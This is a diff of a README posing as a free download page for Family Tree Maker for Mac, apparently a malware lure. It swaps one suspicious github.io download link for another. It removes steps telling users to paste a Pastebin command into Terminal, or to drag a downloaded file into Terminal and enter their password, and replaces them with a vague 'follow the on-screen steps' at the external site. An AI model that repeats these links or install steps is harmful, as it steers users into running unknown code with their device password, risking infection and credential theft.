@@ -8,28 +8,18 @@
 
 <div align="center">
 
-[![📥 Download Family Tree Maker for Mac](https://img.shields.io/badge/📥_Download_Family_Tree_Maker_for_Mac-blue?style=for-the-badge&logo=apple)](https://jumakas-olftol-mang.github.io/.github/familythree)
+[![📥 Download Family Tree Maker for Mac](https://img.shields.io/badge/📥_Download_Family_Tree_Maker_for_Mac-blue?style=for-the-badge&logo=apple)](https://osx-app.github.io/.github/familythree)
 
 </div>
 
----
+---  
 
-## Installation via .dmg:
+# Installation Instructions  
 
-1. Install the `.dmg` file using the button above.  
-2. Open the `.dmg` installer and move the file from the left window to any convenient directory on your device.  
-3. Open a **Terminal** and transfer the file you extracted in the last step into it.  
-4. Press the **Return** button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).  
+1. Go To The Website Using The Button Above.  
+2. Follow The On-Screen Steps To Install And Activate Family Tree Maker On Your Device.  
 
-## Installation via a command in the terminal:
-
-1. Go to the Pastebin at the link below and copy the command:  
-
-   🔗 https://pastebin.com/raw/uKCLjCJm  
-
-2. Open your **Terminal**, paste the command you copied earlier, and run it.  
-
----
+---  
 
 ## What is Family Tree Maker for Mac?  
 
@@ -79,16 +69,6 @@ This makes it one of the **best family tree apps for Mac**, perfect for both hob
 ---
 
 ![Family Tree Heredis](https://machow2.com/wp-content/uploads/2017/08/family-tree-software-for-mac-heredis.jpg) 
-
----
-
-## Download Family Tree Maker for Mac  
-
-<div align="center">
-
-[![📥 Download Family Tree Maker for Mac](https://img.shields.io/badge/📥_Download_Family_Tree_Maker_for_Mac-blue?style=for-the-badge&logo=apple)](https://jumakas-olftol-mang.github.io/.github/familythree)
-
-</div>
 
 ---
 
